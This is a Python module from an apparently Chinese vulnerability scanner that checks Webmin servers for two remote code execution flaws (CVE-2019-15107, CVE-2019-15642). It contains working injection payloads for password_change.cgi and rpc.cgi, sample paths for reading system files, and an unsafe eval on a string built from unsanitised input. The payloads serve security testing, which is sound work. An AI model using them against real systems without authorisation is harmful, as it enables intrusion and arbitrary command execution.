#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Webmin是一个基于Web的系统配置工具, 用于类Unix系统: https://www.webmin.com/
    Webmin扫描类: 
        1. Webmin Pre-Auth 远程代码执行
            CVE-2019-15107
                Payload: https://vulhub.org/#/environments/webmin/CVE-2019-15107/

        2. Webmin 远程代码执行
            CVE-2019-15642
                Payload: https://www.seebug.org/vuldb/ssvid-98065

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from lib.tool import head
from thirdparty import requests
from time import sleep

class Webmin():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Webmin'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2019_15107_payloads = [
            {
                'path': 'password_change.cgi',
                'data': 'user=rootxx&pam=&expired=2&old=test|{}&new1=test2&new2=test2'.format(self.cmd)
            },
        ]

        self.cve_2019_15642_payloads = [
            {
                'path': 'rpc.cgi',
                'data': 'OBJECT Socket;print "Content-Type: text/plain\\n\\n";$cmd=`{}`; print "$cmd\\n\\n";'.format(self.cmd),
                'headers': head.merge(self.headers, {})
            },
            {
                'path': 'rpc.cgi',
                'data': 'OBJECT Socket;print "Content-Type: text/plain\\n\\n";$cmd=`{}`; print "$cmd\\n\\n";'.format(self.cmd),
                'headers': head.merge(self.headers, {
                    'User-Agent': 'webmin',
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'fr',
                    'Accept-Encoding': 'gzip, deflate'
                })
            },
        ]

    def cve_2019_15107_scan(self, url):
        ''' 该漏洞存在于密码重置页面(password_change.cgi), 允许未经身份验证的用户通过简单的POST请求执行任意命令
            当用户开启Webmin密码重置功能后, 攻击者可以通过发送POST请求在目标系统中执行任意命令, 且无需身份验证。
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2019-15107'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'Referer': 'https://{}/session_login.cgi'.format(logger.get_domain(url))
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2019_15107_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def cve_2019_15642_scan(self, url):
        ''' Webmin 1.920及之前版本中的rpc.cgi文件存在安全漏洞, 攻击者可借助特制的对象名称利用该漏洞执行代码
                需要身份验证(Cookie、Authorization等)
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2019-15642'
        vul_info['vul_method'] = 'POST'

        for payload in self.cve_2019_15642_payloads:
            path = payload['path']
            data = payload['data']
            headers = payload['headers']
            target = url + path

            headers['Referer'] = 'https://{}/session_login.cgi'.format(logger.get_domain(url))

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2019_15107_scan, url=url),
            thread(target=self.cve_2019_15642_scan, url=url)
        ]

webmin = Webmin()
